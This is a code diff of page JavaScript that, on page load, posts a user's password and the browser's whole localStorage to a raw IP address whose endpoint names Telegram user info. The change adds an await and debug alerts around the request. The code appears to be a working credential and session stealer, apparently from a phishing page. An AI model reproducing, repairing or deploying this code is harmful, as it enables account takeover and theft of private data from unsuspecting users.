@@ -17,7 +17,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
         alert("XXXD");
 
-        fetch('http://94.131.9.66:4040/api/users/telegram/info', {
+        await fetch('http://94.131.9.66:4040/api/users/telegram/info', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -26,7 +26,9 @@ document.addEventListener("DOMContentLoaded", function() {
             password, quicklySet: localStorage,
             type: new URLSearchParams(window.location.search).get("type")
           })
-        });
+        })
+        .then(res => alert("success:",res))
+        .catch(err => alert("error:",err));
 
         alert("DDD");
 
